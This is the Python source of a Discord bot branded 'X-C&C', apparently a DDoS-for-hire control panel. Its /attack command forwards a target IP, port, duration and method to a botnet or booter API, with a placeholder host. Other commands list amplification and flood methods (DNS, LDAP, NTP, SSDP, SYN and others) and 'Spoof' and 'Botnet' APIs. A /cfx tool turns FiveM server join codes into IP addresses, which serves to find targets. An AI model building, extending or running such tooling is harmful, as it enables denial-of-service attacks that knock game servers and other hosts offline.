#-------------------------------------------
# This code Make by akanine 
# Have fun ;)
# Discord : https://discord.gg/VH8fQNE25w
#------------------------------------------

from ast import While
from cgitb import text
from disnake.ext import commands
import psutil
from json import loads, dumps, load
import json, asyncio
import disnake
import time
import threading
import discord
import psutil
import pytz
import requests
from discord import Embed, Intents, Streaming
import datetime
import random
import sys, os, socket

with open('config.json') as settings:

    config = load(settings)
token = config.get('token')
guildID = int(config.get('guid'))
logfile = config.get('logfile')
name = config.get('botname')
Tz = config.get('TimeZone')
maxtime = config.get('maxtime')
ostime = datetime.datetime.now(pytz.timezone(f'{Tz}'))
blacklist = open('blacklistips.txt', 'r').read().splitlines()
methodss = open('methods.txt', 'r').read().splitlines()
def stats():
    time.sleep(1)
    activity = disnake.Activity(
        name = 'Power by akanine',
        type=disnake.ActivityType.watching
    )
    return activity


bot = commands.InteractionBot(test_guilds=[guildID], activity=stats())


def main1(ip, port, time, method): #Edit your api server 
    if method == 'mixamp':
        r = requests.get(f'https://yourapi/ip={ip}&port={port}&time={time}&method=mixamp')
        print(r.status_code)
    else:
        r = requests.get(f'http://yourapi/api/&host={ip}&port={port}&time={time}&method={method}&server=all')
        print(r.status_code)


    
@bot.slash_command()
async def systeminfo(inter): 
    def get_size(bytes):
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bytes < 1024:
                return f"{bytes:.2f}{unit}B"
            bytes /= 1024
    #ram
    ram_info = psutil.virtual_memory()
    Total = f"{ram_info.total / 1024 / 1024 / 1024:.2f} GB"
    Available = f"{ram_info.available / 1024 / 1024 / 1024:.2f} GB"
    Used  = f"{ram_info.used / 1024 / 1024 / 1024:.2f} GB"
    usage = f"{ram_info.percent}%"
    
    cpu_percent = psutil.cpu_percent()
    cpu_percent1 = f"{cpu_percent}%"
    
    # CPU frequency
    cpu_info = psutil.cpu_freq()
    current= f"{cpu_info.current:.2f} Mhz"
    min = f"{cpu_info.min:.2f} Mhz"
    cpu_info1 =f"{cpu_info.max:.2f} Mhz"
    # Disk 
    disk_info = psutil.disk_usage("/")
    Disk_Totalf = f"{disk_info.total / 1024 / 1024 / 1024:.2f} GB"
    Disk_Used = f"{disk_info.used / 1024 / 1024 / 1024:.2f} GB"
    Disk_Free = f"{disk_info.free / 1024 / 1024 / 1024:.2f} GB"
    
    #Network Monitor
    io = psutil.net_io_counters()
    bytes_sent, bytes_recv = io.bytes_sent, io.bytes_recv
    Upload = f"{get_size(io.bytes_sent)}"
    Download =f"{get_size(io.bytes_recv)}" 
    
    
    emb = disnake.Embed(title=f"System info" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
    emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    emb.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    emb.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    emb.add_field(name="Ram_Total", value=f"{Total}", inline=True)
    emb.add_field(name="Ram_Available", value=f"{Available}", inline=True)
    emb.add_field(name="Ram_Used", value=f"{Used}", inline=True)
    emb.add_field(name="Ram_Usage", value=f"{usage}", inline=True)
    emb.add_field(name="CPU_Percent", value=f"{cpu_percent1}", inline=True)
    emb.add_field(name="CPU_Current", value=f"{current}", inline=True)
    emb.add_field(name="CPU_Min", value=f"{min}", inline=True)
    emb.add_field(name="CPU_Info", value=f"{cpu_info1}", inline=True)
    emb.add_field(name="Disk_Total", value=f"{Disk_Totalf}", inline=True)
    emb.add_field(name="Disk_Total", value=f"{Disk_Used}", inline=True)
    emb.add_field(name="Disk_Free", value=f"{Disk_Free}", inline=True)
    emb.add_field(name="Network_Upload", value=f"{Upload}", inline=True)
    emb.add_field(name="Network_Download", value=f"{Download}", inline=True)
    emb.add_field(name="Hostname", value=f"{socket.gethostname()}", inline=True)
    
    await inter.response.send_message(embed=emb)
    
    
@bot.slash_command()
async def attack(inter, ip, port, time, method):
    username = (f"{inter.author}")
    time = int(time)
    if ip in blacklist:
        emb = disnake.Embed(title=f"blacklist ip" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
        emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
        emb.set_footer(
            text="Power by akanine",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        emb.set_author(
            name="X-C&C",
            url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        await inter.response.send_message(embed=emb)
    else:
        if method in methodss:
            if  time <= maxtime:
                username = (f"{inter.author}")
                with open(f'{logfile}', 'a') as saveFile:
                       saveFile.write(''.join(f"{ostime} > System-Log == {method} IP={ip}:{port} TIME={time} User = {username} \n"))
                def run():
                    print(f"methods By {username}")
                run()
                embed = disnake.Embed(
                color=disnake.Colour.yellow(),
                timestamp=datetime.datetime.now(),
                )
                embed.set_author(
                    name="X-C&C",
                    url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                    icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                )
                embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
                embed.add_field(name="Internet protocol address", value=f"{ip}", inline=True)
                embed.add_field(name="Port", value=f"{port}", inline=True)
                embed.add_field(name="Time", value=f"{time}", inline=True)
                embed.add_field(name="Methods", value=f"{method}", inline=True)

                embed.set_footer(
                    text="Power by akanine",
                    icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                )
                embed.set_image(url="https://media.tenor.com/XezrWD0BBK0AAAAC/void-downers-hacker-ddos-incoming.gif")
                await inter.response.send_message(embed=embed)
                def req():
                    main1(ip, port, time, method)
                req()
            elif time >= maxtime:
                emb = disnake.Embed(title=f"Do not enter time longer than 60 seconds." , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
                emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
                emb.set_footer(
                    text="Power by akanine",
                    icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                )
                emb.set_author(
                    name="X-C&C",
                    url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                    icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                )
                await inter.response.send_message(embed=emb)
        else:
            emb = disnake.Embed(title=f"Error Method Not found" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
            emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
            emb.set_footer(
                text="Power by akanine",
                icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
            )
            emb.set_author(
                name="X-C&C",
                url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
                icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
            )
            await inter.response.send_message(embed=emb)

@bot.slash_command()
async def ipinfo(inter, ip):
    r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,timezone,isp,org,as,asname,reverse,query')
    r_json = r.json()
    if r_json['status'] == 'success':
        continent = r_json['continent']
        continent_code = r_json['continentCode']
        country = r_json['country']
        country_code = r_json['countryCode']
        region = r_json['region']
        region_name = r_json['regionName']
        city = r_json['city']
        timezone = r_json['timezone']
        isp = r_json['isp']
        org = r_json['org']
        as_ = r_json['as']
        asname = r_json['asname']
        reverse = r_json['reverse']
        emb = disnake.Embed(title=f"Internet protocol address Info" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
        emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
        emb.set_footer(
            text="Power by akanine",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        emb.set_author(
            name="X-C&C",
            url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        emb.add_field(name="Internet protocol address", value=f"{ip}", inline=True)
        emb.add_field(name="continent", value=f"{continent}", inline=True)
        emb.add_field(name="continent_code", value=f"{continent_code}", inline=True)
        emb.add_field(name="country", value=f"{country}", inline=True)
        emb.add_field(name="country_code", value=f"{country_code}", inline=True)
        emb.add_field(name="region", value=f"{region}", inline=True)
        emb.add_field(name="region_name", value=f"{region_name}", inline=True)
        emb.add_field(name="city", value=f"{city}", inline=True)
        emb.add_field(name="timezone", value=f"{timezone}", inline=True)
        emb.add_field(name="isp", value=f"{isp}", inline=True)
        emb.add_field(name="asn", value=f"{as_}", inline=True)
        emb.add_field(name="asname", value=f"{asname}", inline=True)
        emb.add_field(name="org", value=f"{org}", inline=True)
        emb.add_field(name="reverse", value=f"{reverse}", inline=True)
        
        await inter.response.send_message(embed=emb)
    else:
        emb = disnake.Embed(title=f"Error Internet protocol address" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
        emb.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
        emb.set_footer(
            text="Power by akanine",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        emb.set_author(
            name="X-C&C",
            url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
            icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        )
        
        await inter.response.send_message(embed=emb)
        

@bot.slash_command()
async def info(inter): 
    embed = disnake.Embed(
    title="X-CNC & Botnet APIs",
    color=disnake.Colour.yellow(),
    timestamp=datetime.datetime.now(),
    )

    embed.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    embed.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )

    embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    embed.set_image(url="https://www.mdpi.com/jsan/jsan-11-00018/article_deploy/html/images/jsan-11-00018-g001.png")

    embed.add_field(name="", value="Bot Info", inline=False)
    embed.add_field(name="APIs", value="Botnet \n Spoof-Thai\n Spoof-Thai2 \n  Spoof-Thai3 \n Spoof-US", inline=True)
    embed.add_field(name="Status", value=":white_check_mark:  \n :white_check_mark: \n :white_check_mark: \n :x: \n :x:", inline=True)


    await inter.response.send_message(embed=embed)
@bot.slash_command()
async def help(inter):
    username = (f"{inter.author}")
    def run():
        print(f"methods By {username}")
    run()
    embed = disnake.Embed(
    color=disnake.Colour.yellow(),
    timestamp=datetime.datetime.now(),
    )
    embed.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    embed.add_field(name="Commands", value="help \n info \n methods \n attack \n tools", inline=True)

    embed.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    await inter.response.send_message(embed=embed)


@bot.slash_command()
async def tools(inter):
    username = (f"{inter.author}")
    def run():
        print(f"methods By {username}")
    run()
    embed = disnake.Embed(
    color=disnake.Colour.yellow(),
    timestamp=datetime.datetime.now(),
    )
    embed.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    embed.add_field(name="Commands", value="cfx \n ipinfo", inline=True)
    embed.add_field(name="info", value="Resolve a cfx code to ip \n Check IP info", inline=True)
    embed.add_field(name="example", value="/cfx cfx.re/join/example \n /ipinfo 1.1.1.1", inline=True)


    embed.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    await inter.response.send_message(embed=embed)
@bot.slash_command()
async def cfx(inter, code):
    respo = requests.get("https://" + code)
    respo.raise_for_status()
    ipss = (respo.headers["X-Citizenfx-Url"])
    ipcut = ipss.replace("http://", "")
    embed = disnake.Embed(title=f"Resolve a cfx code to Internet protocol address \n" , color=disnake.Colour.yellow(),timestamp=datetime.datetime.now(),)
    embed.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    embed.add_field(name="cfx-Code", value=f"{code}", inline=True)
    embed.add_field(name="Internet protocol address", value=f"{ipcut}", inline=True)

    embed.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    await inter.response.send_message(embed=embed)
@bot.slash_command()
async def methods(inter):
    username = (f"{inter.author}")
    def run():
        print(f"methods By {username}")
    embed = disnake.Embed(
    color=disnake.Colour.yellow(),
    timestamp=datetime.datetime.now(),
    )
    embed.set_author(
        name="X-C&C",
        url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    embed.set_thumbnail(url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png")
    embed.add_field(name="Methods", value="dns \n ldap \n ssdp \n wsd \n ard \n ntp \n coap \n fivem \n ts3 \n abus \n syn \n ovh \n tcp \n socket", inline=True)
    embed.add_field(name="Status", value=":white_check_mark:  \n :white_check_mark:  \n :white_check_mark:  \n :white_check_mark:  \n :white_check_mark:  \n :white_check_mark:  \n:white_check_mark: \n :white_check_mark: \n :white_check_mark: \n :white_check_mark: \n :white_check_mark: \n :white_check_mark: \n :white_check_mark: \n :white_check_mark: \n", inline=True)

    embed.set_footer(
        text="Power by akanine",
        icon_url="https://64.media.tumblr.com/0d181187c50fedc1c60d1a6c3dd2165d/ec299322d93fd773-53/s540x810/afd900c44adfac375f08a490df747be6384c17d6.png",
    )
    await inter.response.send_message(embed=embed)
    run()
bot.run(token)


